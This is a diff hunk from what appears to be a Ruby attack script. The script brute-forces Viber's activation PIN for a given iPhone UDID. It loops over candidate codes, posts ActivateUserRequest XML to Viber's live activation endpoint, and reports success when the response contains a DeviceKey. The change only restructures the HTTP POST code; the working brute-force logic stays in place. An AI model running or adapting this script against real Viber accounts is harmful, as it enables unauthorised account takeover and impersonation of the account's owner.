@@ -53,18 +53,15 @@ puts "[+] Figuring out PIN for #{opts[:iphone_udid]}. This could take a while."
       value = "<ActivateUserRequest><UDID>#{opts[:iphone_udid]}</UDID><ActivationCode>#{pin}</ActivationCode><ProtocolVersion>10</ProtocolVersion></ActivateUserRequest>" 
 
       # GO GO GO
-      url = "http://wa.viber.com/viber/viber.php?function=ActivateUser"
-      uri = URI.parse(url)
-            
-      # Craft post
-      req = Net::HTTP::Post.new(url)
-      req.set_form_data({key => value})
+      uri = URI('http://wa.viber.com/viber/viber.php?function=ActivateUser')
       
-      # Execute
-      res = Net::HTTP.new(uri.host, uri.port).start { |http| http.request(req) }
-
-      # Success?
-      if /.*DeviceKey.*/.match res.body
+      http = Net::HTTP.new(uri.host, uri.port)
+      
+      request = Net::HTTP::Post.new(uri.request_uri)
+      request.set_form_data({key => value})      
+              
+      # Execute & Success?
+      if /.*DeviceKey.*/.match http.request(request).body
         puts "[+] Success: found PIN: #{pin}"
         exit
       end
